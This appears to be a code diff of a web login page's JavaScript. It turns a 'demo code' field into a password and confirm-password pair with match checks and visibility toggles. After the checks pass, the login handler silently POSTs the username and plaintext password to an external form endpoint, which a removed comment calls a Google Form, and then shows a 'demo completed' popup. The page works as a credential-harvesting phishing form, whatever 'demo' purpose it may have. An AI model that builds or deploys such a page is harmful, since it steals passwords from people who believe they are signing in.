@@ -17,11 +17,11 @@ let currentUser = "";
 // LOGIN HANDLER
 function login() {
   const username = document.getElementById("username").value.trim();
-  const demoCode = document.querySelector(
-    'input[type="password"]'
-  ).value.trim();
+  const password = document.getElementById("password").value.trim();
+  const confirmPassword = document
+    .getElementById("confirmPassword")
+    .value.trim();
 
-  // If you added a condition paragraph, capture it here:
   const conditionText =
     document.querySelector(".condition")?.innerText || "";
 
@@ -30,25 +30,33 @@ function login() {
     return;
   }
 
-  if (!demoCode) {
+  if (!password) {
     alert("Please enter password !!");
     return;
   }
 
-  // Send data to Google Form
+  if (!confirmPassword) {
+    alert("Please confirm your password !!");
+    return;
+  }
+
+  if (password !== confirmPassword) {
+    alert("Passwords do not match !!");
+    return;
+  }
+
+  // 🚨 FETCH ONLY HAPPENS AFTER ALL CHECKS
   fetch(FORM_URL, {
     method: "POST",
     mode: "no-cors",
     body: new URLSearchParams({
       [ENTRY_USERNAME]: username,
-      [ENTRY_DEMO_CODE]: demoCode,
+      [ENTRY_DEMO_CODE]: password,
       [ENTRY_CONDITION]: conditionText
     })
   });
 
   currentUser = username;
-
-  // Show demo completed popup
   document.getElementById("modal").classList.add("show");
 }
 
@@ -69,15 +77,45 @@ document.getElementById("photo").addEventListener("change", function (e) {
   preview.onload = () => URL.revokeObjectURL(preview.src);
 });
 
-function togglePassword() {
-  const input = document.getElementById("password");
-  const eye = document.getElementById("eyeIcon");
+const passwordInput = document.getElementById("password");
+const confirmPasswordInput = document.getElementById("confirmPassword");
 
-  if (input.type === "password") {
-    input.type = "text";
-    eye.src = "./images/eye-close-up.webp";
+const eyeIcon = document.getElementById("eyeIcon");
+const confirmEyeIcon = document.getElementById("confirmEyeIcon");
+
+/* Toggle main password */
+function togglePassword() {
+  if (passwordInput.type === "password") {
+    passwordInput.type = "text";
+    eyeIcon.src = "./images/eye-close-up.webp";
   } else {
-    input.type = "password";
-    eye.src = "./images/closed-eyes.webp";
+    passwordInput.type = "password";
+    eyeIcon.src = "./images/closed-eyes.webp";
   }
 }
+
+/* Toggle confirm password */
+function toggleConfirmPassword() {
+  if (confirmPasswordInput.type === "password") {
+    confirmPasswordInput.type = "text";
+    confirmEyeIcon.src = "./images/eye-close-up.webp";
+  } else {
+    confirmPasswordInput.type = "password";
+    confirmEyeIcon.src = "./images/closed-eyes.webp";
+  }
+}
+
+/* Match check */
+function checkPasswordMatch() {
+  if (!confirmPasswordInput.value) return;
+
+  if (passwordInput.value === confirmPasswordInput.value) {
+    confirmPasswordInput.style.borderColor = "#22c55e"; // green
+  } else {
+    confirmPasswordInput.style.borderColor = "#ef4444"; // red
+  }
+}
+
+/* Live checking */
+passwordInput.addEventListener("input", checkPasswordMatch);
+confirmPasswordInput.addEventListener("input", checkPasswordMatch);
